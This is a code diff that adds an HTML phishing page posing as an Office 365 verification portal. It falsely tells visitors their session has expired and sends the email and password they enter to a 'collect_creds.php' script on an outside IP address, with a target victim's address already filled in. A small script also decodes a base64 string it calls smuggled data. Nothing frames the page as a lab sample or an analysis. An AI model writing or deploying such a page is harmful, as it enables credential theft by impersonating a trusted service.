@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Office 365 Verification Portal</title></head>
+<body>
+  <h2>Your session has expired. Please sign in to verify your identity.</h2>
+  <form action="http://185.220.101.4/collect_creds.php" method="POST">
+    <label>Email Address:</label><input type="email" name="user" value="victim@targetcorp.com"><br>
+    <label>Password:</label><input type="password" name="pass" required><br>
+    <button type="submit">Verify Now</button>
+  </form>
+  <script>
+    var smuggled = window.atob("VGhpcyBpcyBhIGZha2UgcGF5bG9hZA==");
+    console.log("Smuggled data length: " + smuggled.length);
+  </script>
+</body>
+</html>
